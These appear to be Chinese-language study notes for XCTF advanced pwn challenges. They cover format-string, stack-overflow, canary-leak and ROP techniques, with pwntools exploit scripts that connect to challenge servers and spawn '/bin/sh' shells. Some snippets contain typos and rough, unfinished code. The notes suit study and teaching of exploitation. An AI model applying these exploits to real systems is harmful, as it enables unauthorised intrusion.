## 实时数据监测
格式化字符串漏洞:
```c
printf(&s);
if ( key == 35795746 )
    result = system("/bin/sh")
```
**查看偏移**：

dudu@kali:~/桌面/learn/pwn/xctf/进阶$ ./实时数据监测 

输入：AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p

AAAA-0xf7f662c0-0xffae5664-(nil)-0xf7f30000-0xf7f30000-0xffae5618-0x80484e7-0xffae5410-0x200-0xf7f30580-0xf7f5556d-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025

The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻

fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。

实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})

**payload**:
```python
payload=fmtstr_payload(12,{0x804a048:0x2223322})
```
## dice_game
与guess_num题目相同。出现srand(seed[0])语句，套路是输入字符串覆盖加密种子。之前果然有输入语句：v6 =  = read(0, buf, 0x50uLL);

溢出：
```c
  v6 = read(0, buf, 0x50uLL);   //本身不存在缓冲区溢出漏洞
  srand(seed[0]);
```
该题的逻辑是输入数字，与系统的随机数进行50次比较，如果全对，则得到flag。

```c
  _isoc99_scanf("%hd", &v1);  //v1为输入的数字0～6
  if ( v1 > 0 && v1 <= 6 )
  {
    v2 = rand() % 6 + 1;            //v2为系统生成的随机数
     if ( v1 == v2 )
    {
      puts("You win.");
      result = 1LL;
    }
    else
    {
      puts("You lost.");
      result = 0LL;
    }
  }
```

查看栈帧：

-0000000000000050 buf             db 55 dup(?)

-0000000000000019 var_19          db ?

-0000000000000018 var_18          dq ?

-0000000000000010 seed            dd 2 dup(?)

可以通过溢出覆盖seed[0]的值

**payload**
```python
payload=0x40*"a"+p64(0)
```

**注意该题给出libc，因此需要从libc中调用rand函数发送**

```python
libc = cdll.LoadLibrary("libc.so.6")

a=[]
for i in range(50):
	a.append(libc.rand()%6+1)
print(a)
for i in a:
	p.recv()
	print(p.recv())
	p.sendline(str(i))
p.interactive()
```
## stack2
本题的难点是找出栈溢出，本题的栈溢出并不是常规的 read 这种输入输出流，而是数组没有边界检查导致的，这样的栈溢出比较隐蔽。

栈溢出：
```c
if ( v6 != 3 )
        break;
puts("which number to change:");
__isoc99_scanf("%d", &v5);
puts("new number:");
__isoc99_scanf("%d", &v7);
v13[v5] = v7;
```
1、**值得注意的是**当输入3进行change number的时候，直接将v7赋值给数组v13[v5]，没有对v5进行范围检查，从而会造成ROP攻击。这代表着我们可以修改数组以及数组后面的任何数据。

2、为此，我们需要知道栈顶距离返回地址的位置，才能在主函数返回时，直接执行我们的shellcode。

   按照writeup，下了两个断点，分别是在给v13数组赋初值和返回retn的时候。

   为此，下两个断点，分别是0x80486D5和0x80488F2。

   *EAX  0xffffd138 ◂— 0x1(数组的首地址)。

   *ESP  0xffffd1bc —▸ 0xf7df1ef1 (__libc_start_main+241) ◂— add    esp, 0x10(函数的返回地址)//当函数运行到return语句的时候，栈顶一定是返回地址。

   0xffffd1bc-0xffffd138=0x84。

3、左边的函数中有hackhere函数，但是实际上服务器没有bash的选项，该函数是干扰项，此处需要字符串“sh”。ROPgadget --binary stack2 --string 'sh'

4、使用UE，寻找sh字符串的地址，或如第三条使用ROPgadget工具实现。
   ```c
def change(addr,num):
        sh.sendlineafter("5. exit\n","3")
        sh.sendlineafter("which number to change:\n",str(addr))
        sh.sendlineafter("new number:\n",str(num))

   change(0x84, 0x50)
   change(0x85, 0x84)
   change(0x86, 0x04)
   change(0x87, 0x08)//system的plt地址：0x804850
   change(0x8c, 0x87)
   change(0x8d, 0x89)
   change(0x8e, 0x04)
   change(0x8f, 0x08)//sh字符串的地址：0x8048980
```

本题目静态反汇编如下：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //打印信息
  puts("***********************************************************");
  puts("*                      An easy calc                       *");
  puts("*Give me your numbers and I will return to you an average *");
  puts("*(0 <= x < 256)                                           *");
  puts("***********************************************************");
  //输入数字个数
  puts("How many numbers you have:");
  __isoc99_scanf("%d", &v5);
  //将输入的数字放于数组中
  puts("Give me your numbers");
  //简化处理
  while（1）
  {
	puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit");
        __isoc99_scanf("%d", &v6);
	if(v6==1)
	{
		 puts("id\t\tnumber");
        	 for ( k = 0; k < j; ++k )
         		 printf("%d\t\t%d\n", k, v13[k]);
	}
	if(v6==2)
	{
		puts("Give me your number");
          	__isoc99_scanf("%d", &v7);
          	if ( j <= 0x63 )
          	{
            		v3 = j++;
            		v13[v3] = v7;
         	 }	
	}
	if(v6==3)
	{
		puts("which number to change:");
      		__isoc99_scanf("%d", &v5);
      		puts("new number:");
      		__isoc99_scanf("%d", &v7);
      		v13[v5] = v7;//strlen(v13)为0x70，此处未对v5大小进行检查
	}
	if(v6==4)
	{
		 v9 = 0;
    		 for ( l = 0; l < j; ++l )
     			 v9 += v13[l];
	}
		
  }
```

1、retn操作：先eip=esp，然后esp=esp+4；retn N操作：先eip=esp，然后esp=esp+4+N

2、gadget修改寄存器的方法

## forget
溢出漏洞。
```c
 __isoc99_scanf("%s", &v2);

char * a1 = (*((_BYTE *)&v2 + i));
if (a1 > 96 && a1 <= 122 || a1 > 47 && a1 <= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46)
          v14 = 2;
 (*(&v3 + --v14))();
```
栈结构：

-00000074                 db ? ; undefined                       //v2

...

-00000054                 db ? ; undefined                       //v3

1）查看strings window找到"cat %s"以及"./flag"，根据交叉引用找到0x80486cc函数的语句大致为sprintf(command,"cat %s","./flag");system(command);可以直接得到shell。

第88行是将变量强制转换为函数指针类型：(*(&v3 + --v14))();如果v14为1时，可能执行v3，我们可以把0x80486cc的地址放入v3之中。

2）通过输入将0x80486cc的地址放入v3中：仔细观察后发现v2的栈顶位置为0x74，而v3的栈顶位置为0x54，我们可以利用溢出的方法在v2中输入(0x74-0x54)个a，之后再写入0x80486cc

3）将v14的值设为1：需要在
```c
	case 1:
		if ( sub_8048702(*((_BYTE *)&v2 + i)) )
          		v14 = 2;
        	break;
```
代码中让函数sub_8048702(*((_BYTE *)&v2 + i))返回0

因此v2的值需要在v2 > 96 && v2 <= 122 || v2 > 47 && v2 <= 57 || v2 == 95 || v2 == 45 || v2 == 43 || v2 == 46;的范围之外，我们发现A的ASCII码值为61，满足条件。

**pyload**
```python
payload='A'*(0x20)+p32(addr)
```

## Mary_Morton
运行checksec：

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

发现有canary开启。

发现提示中说明1是栈溢出漏洞，2是格式化字符串漏洞，3是退出程序。
```c
if(v3 == 1)
    read(0, &buf, 0x100uLL);        //栈溢出漏洞
if(v3 == 2)   
    printf(&buf, &buf);                 //格式化字符串漏洞
```

(1)IDA发现按下2键，再输入：AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p，

结果为：

AAAAAAAA-0x7fff6992ffe0-0x7f-0x7fd54bc555ce-0x1999999999999999-(nil)-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0xa70-(nil)-(nil)-0x674fa3cdd0633d00-0x7fff699300b0-0x4008b8-(nil)-0x7fff699301a8-0x7fff69930198-0x100400730-0x269930190-0x674fa3cdd0633d00-0x400a50-0x7fd54bb8de0b-(nil)-0x7fff69930198

发现偏移量为6字节。(发现我们的输入是从第7个位置开始的，由于下标从0开始，此位置在计算机看来为7 - 1)

(2)IDA中查看发现按下1后，调用sub_400960()函数，存在缓冲区溢出漏洞：read(0,&buf,0x100);
buf的大小是0x90,小于第三个参数0x100

(3)查找字符串，发现"/bin/cat ./flag"，交叉引用发现后门函数地址为0x4008DA

(4)首先利用字符串漏洞，泄露出canary的值，然后在函数要返回的时候再填回去，之后利用栈溢出，让其返回到后门函数

注意：   
```c
	v2 = *MK_FP(__FS__, 40LL);
	return *MK_FP(__FS__, 40LL) ^ v2;
```
说明使用了canary。

简单介绍canary：启动该机制后，程序会函数开始执行的时候在栈中插入cookie（随机数），函数之后进行验证cookie的正确性，每次程序运行时生成的canary都不相同。x86-64架构下通过fs：0x28来获取这个数据存放在栈中。在退出栈之前，合并栈中的canary值进行检测。

根据上面说明，cookie的值为v2。

**注意**：
buf和v2相差了0x90-0x8=0x88，0x88/8=17， 17+6（偏移量）=23
因为64位的程序，每个格式化字符串都是8字节，同理32位是4字节

结构如下：

		| stack      |
		| ---------- |
		| 0x88 bytes |
		| Canary     |
		| RBP        |
		| RIP        |

5)构造payload：我们的目的是将canary的值泄漏出来，canary距离buf栈顶的位置相差0x88个字节，%p是将值进行泄漏，前面的位置为17+6，所以paload为：
payload=%23$p，接收到一个十六进制的canary的值。
再次构造payload为：

payload='a'*(0x90-0x8)+p64(canary)+'a'*8+p64(backdoor_addr)

**exp**：
```python
#coding=utf-8
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./Mary_Morton')
#p=process('./Mary_Morton')
p=remote('220.249.52.133','52935')

p.sendlineafter('3. Exit the battle','2')
p.sendline('%23$p')
p.recvuntil('0x')

canary=int(p.recv(16),16)
print(canary)

backdoor_addr=0x4008da
payload=0x88*'a'+p64(canary)+8*'a'+p64(backdoor_addr)

p.sendlineafter('3. Exit the battle','1')
p.sendline(payload)
p.interactive()
p.close()
```
writeup赞最多的第二条和第三条写的不错


1、第二种思路，

方式1:输入2，利用格式化字符串将printf的got地址修改为system的plt地址，再次输入2，输入'/bin/sh\x00'，相当于执行system('/bin/sh\x00')

方式2:输入2，利用格式化字符串将exit的got地址修改为sub_4008DA函数地址（该函数可以直接执行cat./flag）,再次输入3，调用sub_4008DA函数catflag

问题1：writeup中的第三条其他的两种思路的写法

问题2：writeup中第四条中4%23$p的写法

问题3：re.findall(r'\w+\{.+\}', conn.recvuntil('}'))




## warmup

## welpwn
echo函数中存在缓冲区溢出漏洞：
```c
int __fastcall echo(__int64 a1)
{
    for ( i = 0; a1[i]; ++i )
        s2[i] = a1[i];
    s2[i] = 0;
}
  ```

  0、Windows与Linux的调用约定
  
  32位4种调用约定
  64位：Windows——rcx,rdx,r8,r9
              Linux——rdi,rsi,rdx,rcx,r8,r9

1、打开IDA，发现main()函数没有问题，找到echo函数。

但发现echo(buf)函数，其中buf的大小为0x400，在该函数中存在赋值语句：
```c
 for ( i = 0; *(_BYTE *)(i + a1); ++i )
    s2[i] = *(_BYTE *)(i + a1);
```
赋值的终止条件是当读取到a1中\x00的时候。其中s2的大小为0x10。

存在溢出。输入payload的时候，就会在覆盖eip地址后截断(地址一般都有\x00)。

***welpwn的题解（相当详细）***

如果本题目的判断条件不是 for ( i = 0; *(_BYTE *)(i + a1); ++i )，其中a1（buf）不能为00的地址，否则后面的就执行不了啦。


那么payload应该为 payload = 'a'*0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

Welpwn题解(本题解根据writeup第二条分析而来)

首先用IDA查看发现主函数不能栈溢出，我们看看echo这个函数，echo会把主函数输入的字符串复制到局部的s2里，并且s2只有16字节，可以造成溢出。

Echo函数先循环复制字符到s2，如果遇到0，就结束复制，然后输出s2。

因此，我们如果想直接覆盖函数返回地址，那么我们的目标函数必须没有参数，否则，我们用p64(...)包装地址时，必然会出现0。

比如我们的payload为payload = 'a'*0x18+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)由于是64为包装，因此payload字符串为’a’*0x18 + ‘\xa3\x08\x40\x00\x00\x00\x00\x00’+ ‘......’

这意味着，payload后面的两个地址不会被复制到s2，因为前面遇到了0，那么这样我们就不能正确调用出system(“/bin/sh”)。

首先，进入echo函数后，栈中数据：

```
0000000000000000 
0000000000000000 0x10字节数据区
echo函数栈的ebp
echo函数返回地址
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000 0x400字节数据区
................
main函数栈的ebp
```

假如我们在buf中输入的0x400个a字符，那么栈变成这样了

```
aaaaaaaa
aaaaaaaa	0x10字节数据区
aaaaaaaa	echo函数栈的ebp
aaaaaaaa	echo函数返回地址
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
........	0x400字节数据区
main函数栈的ebp
```
因为没有在中途遇到0，所以echo中的循环一直复制buf中的数据到s2中，造成溢出。现在，假如我们的payload = 'a'*0x18+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

那么，栈中的数据变成这样:

```
aaaaaaaa        
aaaaaaaa	0x10字节数据区
aaaaaaaa	echo函数栈的ebp
pop_rdi_addr	echo函数返回地址
aaaaaaaa
aaaaaaaa
aaaaaaaa	
pop_rdi_addr
Binsh_addr
system_addr	0x400字节数据区
main函数栈的ebp
```
这样的话，echo执行完后，跳到pop_rdi地址处执行，然而，pop_rdi执行完后，栈顶指针esp指向buf+0x8 ，即aaaaaaaa，这里不是地址，因此程序崩溃结束。

然而，如果，我们在buf+0x8处存储其他函数地址，也是不可行的，因为该地址是64位，末尾几位有0，这会导致我们还没溢出s2就已停止数据复制


因此，我们有以下总结:

buf的前24字节不能存地址数据，只存普通数据。
buf+24处应该存某一地址，且该地址处有四个pop指令，和一个retn指令。这样，
四次pop后，就相当于跳过了24字节数据和自己本身8字节地址数据。
在接下来的地址处，我们就可以写其他函数。

在0x40089C处正好有四个pop和一个retn:
```
0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

假如我们的payload = 'a'*0x18 + p64(pop_32) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)

那么栈布局如下:
```
aaaaaaaa
aaaaaaaa	0x10字节数据区
aaaaaaaa	echo函数栈的ebp
pop_32_addr(rop)echo函数返回地址		-------------------------------跳转到pop_rdi
aaaaaaaa	pop r12					| 等                                    
aaaaaaaa	pop r13	   				| 价                                                 
aaaaaaaa	pop r14					| 于                                    
pop_32_addr	pop r15 ; ret				|<==>                       
pop_rdi	   《------------------------------------------------------跳转
write_got	//rdi=write_got
puts_plt	//put(write_got)
main_addr	0x400字节数据区
main函数栈的ebp
```
那么，echo函数执行完以后，跳到pop_24地址处，由于跳转后，栈顶指针指向buf，出栈4个后，指针指向buf+32 ，

接下来遇到retn，出栈一个元素为(pop_rdi)作为pop_24的返回地址，这样跳转到了pop_rdi，后面类似。我们调用system 获取到shell

使用libcSearcher：
```python
24.sh.recvuntil('\x40')
25.#泄露write地址
26.write_addr=u64(sh.recv(6).ljust(8,'\x00'))
27.
28.libc=LibcSearcher('write',write_addr)
29.#获取libc加载地址
30.libc_base=write_addr-libc.dump('write')
31.#获取system地址
32.system_addr=libc_base+libc.dump('system')
33.#获取/bin/sh地址
34.binsh_addr=libc_base+libc.dump('str_bin_sh')
```
## monkey
JavaScript shell 是一个命令行程序，它被包含在SpiderMonkey源代码中。它在JavaScript中类似于Python的交互式提示符。本题引入了js库，估计为js语言解释器

本题考察js shell

它的os.system()很有用
```
dudu@kali:~/桌面/learn/pwn/xctf/进阶/money$ ./js
js> ls
typein:1:1 ReferenceError: ls is not defined
Stack:
  @typein:1:1
js> os.system("/bin/sh")
$ ls
js  libnspr4.so  libplc4.so  libplds4.so
```

shellcode为：
```python
p.sendlineafter('js> ', 'os.system(\'cat flag\')')
```
## pwn200
缓冲区溢出：
```c
return read(0, &buf, 0x100u)
```
1、该题目静态反汇编：
```c
int __cdecl main()
{
  signed int v1; // [sp+2Ch] [bp-6Ch]@1
  signed int v2; // [sp+30h] [bp-68h]@1
  signed int v3; // [sp+34h] [bp-64h]@1
  signed int v4; // [sp+38h] [bp-60h]@1
  signed int v5; // [sp+3Ch] [bp-5Ch]@1
  signed int v6; // [sp+40h] [bp-58h]@1
  int v7; // [sp+44h] [bp-54h]@1

  v1 = 'cleW';      //Welc
  v2 = ' emo';      //ome
  v3 = 'X ot';      // to X
  v4 = 'FTCD';      //DCTF
  v5 = '5102';          //2015
  v6 = '\n!~';
  memset(&v7, 0, 0x4Cu);
  write(1, &v1, strlen((const char *)&v1));
  read(0, &buf, 0x100u);    //存在缓冲区溢出漏洞
  return 0;
}
```

其中buf的大小为0x6C，小于第三个参数，因此存在缓冲区溢出漏洞。

本题没有给出system的plt地址和/bin/sh，且没有libc，需要自己构造。

2、各段的含义

①bss段：通常指用来存放程序中未初始化的全局变量和静态变量的一块内存区域，可读写的，在程序执行之前BSS段会自动清0。

②data段：该段用于存储初始化的全局变量，初始化为0的全局变量出于编译优化的策略被保存在BSS段。

③ro段：常量区，用于存放常量数据

④text段：用于存放程序代码的

⑤stack段：栈段，常说的堆栈段之中的一个，由系统负责申请释放

⑥heap段：俗称的堆，由用户申请和释放。申请时至少分配虚存，当真正存储数据时才分配对应的实存，释放时也并不是马上释放实存，而是可能被反复利用。

3、无libc的情况下，通过pwntools中的DynELF模块泄漏地址信息，给出[实现DynELF关键函数leak的方法](https://blog.csdn.net/u011987514/article/details/68490157)

```python
	p = process('./xxx')
	def leak(address):
	  payload = "xxxxxxxx" + address + "xxxxxxxx"
	  p.send(payload)
	  data = p.recv(4)
	  log.debug("%#x => %s" % (address, (data or '').encode('hex')))
	  return data
	d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
	systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址
```
其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。

该方法是在内存中搜索信息，需要目标二进制文件中存在能够泄漏目标系统内存中libc空间内信息的漏洞。条件：

1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；

2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。

4、回归到本题，本题没有给出 libc，要泄露需要用到 DynELF
```python
def leak(address):    
	payload = 'A' * 0x6C + '9527' + p32(write_plt) + p32(0x080483D0) + p32(1) + p32(address) + p32(4)    
	p.sendlineafter('Welcome to XDCTF2015~!\n', payload)    
	data = p.recv(4)    
	return data
...
if __name__ = '__main__':    
...    
	d = DynELF(leak, elf=ELF('./pwn-200'))    
	sys_addr = d.lookup('__libc_system','libc')    
...
```

得到 system_addr 后，需要在 .bss 段上写'/bin/sh'：
```python
if __name__ = '__main__':    
...    
	bss_addr = elf.bss()
```
然后找pop * ; pop * ; pop * ; ret恢复栈，一步到system('/bin/sh')

5、本题目分为两部分：https://blog.csdn.net/weixin_44113469/article/details/873673421) 借助DynELF泄露system地址，这里利用write函数泄露system地址，构造代码
	2) 利用read函数写入"/bin/sh"，调用system（），将"/bin/sh"写入到bss段，使用readelf -a pwn200 | grep bss查看bss段的地址
	如何利用read函数写入"/bin/sh"，参考：https://blog.csdn.net/weixin_44113469/article/details/87005678

6、借助DynELF实现利用的要点：

 1）调用write函数来泄露地址信息，比较方便；

 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；

 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；

 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。

第二个payload的构成：https://blog.csdn.net/weixin_44113469/article/details/87005678

执行 python pwn200.py REMOTE

payload:
```python
##!/usr/bin/python
#coding=utf-8
from pwn import *
pwn_file='./pwn200'
binary = ELF(pwn_file)

# libc = ELF('')

#context.terminal = ['tmux', 'splitw', '-h'] 
context(arch='i386',os='linux')
if args['DEBUG']:
    context.log_level = True 
elif args['REMOTE']: 
    io = remote('220.249.52.133', '56825')
else: 
    io = process(pwn_file)

# gdb.attach(io)

writePLT = binary.plt['write'] 
readPLT = binary.plt['read'] 
bssAddress = binary.bss(0) 
#vulnAddress=binary.symbols['sub_8048484']
vulnAddress = 0x8048484
#ROPgadget --binary pwn200 --only 'pop|ret'，三次pop操作将指针指向systemAddress
ppp_ret=0x804856c  

def leak(address): 
    #112=0x6C+4
    #payload = 'A' * 112 + p32(writePLT) + p32(vulnAddress) + p32(1) + p32(address) + p32(4) 
    #payload=padding+write PLT表地址+返回地址（需要二次发送）+参数1（0表示标准输入流stdin，1表示标准输出流stdout）+参数2（从内存中dump出的4字节system地址）+参数3（写入数据大小）
    payload = flat(['A' * 112,writePLT,vulnAddress,1,address,4]) 
    io.send(payload) 
    data = io.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex'))) 
    return data

io.recvline()

dynelf = DynELF(leak,elf=binary) 
systemAddress = dynelf.lookup("__libc_system",'libc') 
#log.success(hex(systemAddress))
print(hex(systemAddress))

#调用start函数来恢复栈
io.send(flat(['A'*112, 0x080483D0]))
#payload=padding+read PLT表地址（使用read函数来写入地址）+read函数返回地址（写入完成后需要调用system函数）+read函数参数1（0表示标准输入流stdin，1表示标准输出流stdout）+read函数参数2（bss段地址）+read函数参数3（strlen("/bin/sh\x00")+system函数返回地址+system函数的参数(bss段的地址)
payload = flat(['A' * 112,readPLT,systemAddress,0,bssAddress,10,0xdeadbeef,bssAddress])
#payload=flat(['A'*112,readPLT,ppp_ret,0,bssAddress,8,systemAddress,vulnAddress,bssAddress])
io.send(payload) 
io.send('/bin/sh\x00') 
io.interactive() 
```
***注意***:

payload = flat(['A' * 112,readPLT,systemAddress,0,bssAddress,10,0xdeadbeef,bssAddress])可以分解为2部分：
```python

(1)payload1 = 'A'*112 +p32(readPLT)+p32(vulnAddress)+p32(0)+p32(bssAddress)+p32(8)
	io.send(payload1)
	io.send('/bin/sh\x00')
(2)	payload2 = 'a'*112 +p32(systemAddress)+p32(0xdeadbeef)+p32(bssAddress)
	 io.send(payload2)
	 io.interactive() 
```
7、利用libcsearcher解题方法：
```python
#先leak出write函数在libc中的地址
rop1 = 'a'*112+p32(plt_write)+p32(plt_main)+p32(1)+p32(got_write)+p32(4)
p.recvuntil('Welcome to XDCTF2015~!\n')#就是忘了这一句
p.sendline(rop1)
write_addr = u32(p.recv(4))

#利用LibcSearcher获取libc版本
libc = LibcSearcher('write', write_addr)
lib_base = write_addr - libc.dump('write')
system_addr = lib_base + libc.dump('system')
binsh_addr = lib_base + libc.dump('str_bin_sh')

#调用system函数
p.recvuntil('Welcome to XDCTF2015~!\n')
payload1 = 'a' * 112 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
```

## pwn100
缓冲区溢出：
```c
sub_40063D((__int64)&v1, 0xC8u); //该函数存在缓冲区溢出，其中strlen(v1)为0x40

__int64 __fastcall sub_40063D(__int64 a1, unsigned int a2)
{
  //__int64 result; // rax@3
  unsigned int i; // [sp+1Ch] [bp-4h]@1

  for ( i = 0; i<a2; ++i )
  {
    read(0, a1[i], 1);
  }
  return i;
}
```
**本题应该与pwn200一起比较**

方法一、根据writeup第一条参考分析而来

本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和pwn100相比，存在两处差异：

1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；

2）puts函数与write函数不同，不能指定输出字符串的长度。

**第一次利用DynELF泄漏system函数地址的payload**：
```python
def leak(address): 
    payload = "A" * 72 + p64(poprdiAddress) + p64(address) + p64(putsPLT) + p64(startAddress) 
    payload = payload.ljust(200, "B")
    io.send(payload) 
    io.recvuntil('bye~\n') 
    count = 0 
    data = '' 
    up = "" 
    while True: 
        c = io.recv(numb=1, timeout=0.5) 
        count += 1 
        if up == '\n' and c == "":
            data = data[:-1] 
            data += "\x00" 
            break  
        else: 
            data += c 
        up = c 
    data = data[:8] 
    log.info("%#x => %s" % (address, (data or '').encode('hex'))) 
    return data

d = DynELF(leak,elf=binary) 
systemAddress = d.lookup('__libc_system','libc') 
log.success("SystemAddress:" + hex(systemAddress))
```
其栈结构布局：
```
AAAAAAAA
........
AAAAAAAA 
AAAAAAAA	 			#72字节数据区
pop rdi		 			#sub_40063D函数返回地址
address		 			#rdi=address
putsPLT		 			#puts(address)
startAddress	 			#返回地址
```
**第二次payload(写入/bin/sh)**:
```python
payload = 'A' * 72 + p64(pop_6Address) + p64(0) + p64(1) + p64(readGOT) + p64(8) + p64(bssAddress) + p64(0) 
payload += p64(movAddress) 
payload += '\x00' * 56 
payload += p64(startAddress) 
payload = payload.ljust(0xc8,'A')
io.send(payload) 
io.recvuntil('bye~\n') 
io.send('/bin/sh\x00')
```
其栈结构布局：
```
AAAAAAAA
........
AAAAAAAA 
AAAAAAAA		 		#72字节数据区
pop_6Address(rop1)	 			#6个pop后返回，如下：
0		 			#pop rbx
1		 			#pop rbp
readGOT	         			#pop r12
8		 			#pop r13
bssAddress	 			#pop r14
0		 			#pop r15
movAddress(rop2)	 		#mov rdx,r13	第三个参数rdx为8
		 			#mov rsi,r14	第二个参数rsi为bssAddress
					#mov edi,r15d	第一个参数rdi为0
					#call qword ptr [r12+rbx*8] <==> call readGOT(read(0,bssAddress,8))
\x00\x00\x00\x00\x00\x00\x00\x00
........
\x00\x00\x00\x00\x00\x00\x00\x00	#56个'\x00',填充7*8个字节到返回地址
startAddress				#返回地址
AAAAAAAA
........
AAAAAAAA 
AAAAAAAA		 		#为了凑够200个字节
```

**第三次payload(getshell)**:
```python
payload = "A" * 0x48 + p64(poprdiAddress) + p64(bssAddress) + p64(systemAddress) + p64(startAddress) 
payload = payload.ljust(200, "A")
io.send(payload)
```
其栈结构布局
```
AAAAAAAA
........
AAAAAAAA 
AAAAAAAA	 			#72字节数据区
pop_rdi_ret	 			#返回地址
writeAddress	 			#rdi=writeAddress(binsh_addr)
systemAddress	 			#system(writeAddress)
startAddress	 			#返回地址
AAAAAAAA
........
AAAAAAAA 
AAAAAAAA	 			#为了凑够200个字节，(200-72-4*8)字节的‘A’
```
方法二、根据writeup第二条参考分析而来

本方法利用put来泄露read函数的地址，然后再利用LibcSearcher查询可能的libc

(1)泄露read函数位于libc的地址
```python
payload = 'a'*0x48+p64(popedi)+p64(readgot)+p64(putaddr)+p64(mainaddr)+'a'*(0xC8-0x48-32)
```
上面的payload相当于
```
	push read_addr
	pop edi
	call puts
	call main
```
(2)利用libcSearcher搜索匹配到的可能的libc版本，从而获得system的地址和/bin/sh的地址
```python
	#libc数据库查询
	libc=LibcSearcher("read",read_addr)
	
	#得到libc加载地址
	libc_base=read_addr-libc.dump('read')
	
	#获得system地址
	system_addr=libc.dump("system")+libc_base
	
	#获得/bin/sh地址
	binsh_addr=libc.dump("str_bin_sh")+libc_base
```
(3)构造pyload
```python
payloadpayload='a'*0x48+p64(popedi)+p64(binsh_addr)+p64(system_addr)+'a'*(0xC8-0x48-24)
```
上面的payload相当于
```
	push binsh_addr
  	pop edi
    call system
```
exp:
```python
#coding:utf8
from pwn import *
from LibcSearcher import *

elf=ELF('./pwnh5')

#x86都是靠栈来传递参数的,而x64换了它顺序是rdi,rsi,rdx,rcx,r8,r9,如果多于6个参数才会用栈
readgot=elf.got['read']
putaddr=elf.sym['puts']
mainaddr=0x4006B8

#popedi的地址
popedi=0x400763
#sh=process('./pwnh5')
sh=remote('111.198.29.45',52630)

#这个payload用于泄露read位于libc的地址
#popedi将read的地址加载到edi中，用于传给put输出显示
#mainaddr为覆盖eip，这样我们又可以重新执行main函数了
payload='a'*0x48+p64(popedi)+p64(readgot)+p64(putaddr)+p64(mainaddr)+'a'*(0xC8-0x48-32)
sh.send(payload)

sh.recvuntil('bye~\n')
#注意，这步重要,必须要去掉末尾的\n符号
s=sh.recv().split('\n')[0]
#凑足长度8
for i in range(len(s),8):
	s=s+'\x00'
#得到read的地址
addr=u64(s)
print hex(addr)

#libc数据库查询
obj=LibcSearcher("read",addr)
#得到libc加载地址
libc_base=addr-obj.dump('read')
#获得system地址
system_addr=obj.dump("system")+libc_base
#获得/bin/sh地址
binsh_addr=obj.dump("str_bin_sh")+libc_base

print hex(system_addr)
print hex(binsh_addr)

payload='a'*0x48+p64(popedi)+p64(binsh_addr)+p64(system_addr)+'a'*(0xC8-0x48-24)
sh.send(payload)
sh.interactive()
```

## pwn1
运行checksec，查看保护机制：

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

本题开了金丝雀，存在cookie。

静态反汇编如下：
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  memset(&s, 0, 0x80);
  while ( 1 )
  {
    puts("1.2.3...");
    if(read(0,&s,0x20)<0)
	return 1;
    v3 = atoi(&s);
	
    if ( v3 == 1 )
      read(0, &s, 0x100uLL);//strlen(s)<0x100 ，存在缓冲区溢出漏洞
    else if ( v3 == 2 )
    {
      puts(&s); //可将标识位拉出
      sub_400826((const char *)&unk_400AE7);
    }
    else if ( v3 == 3 )
      return 0LL;
    else
      sub_400826("invalid choice");
  }
    return 1;
}
```

查看缓冲区s的结构发现，总大小为090。而canary为var_8变量，在0x8的位置。

如图所示：
```
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
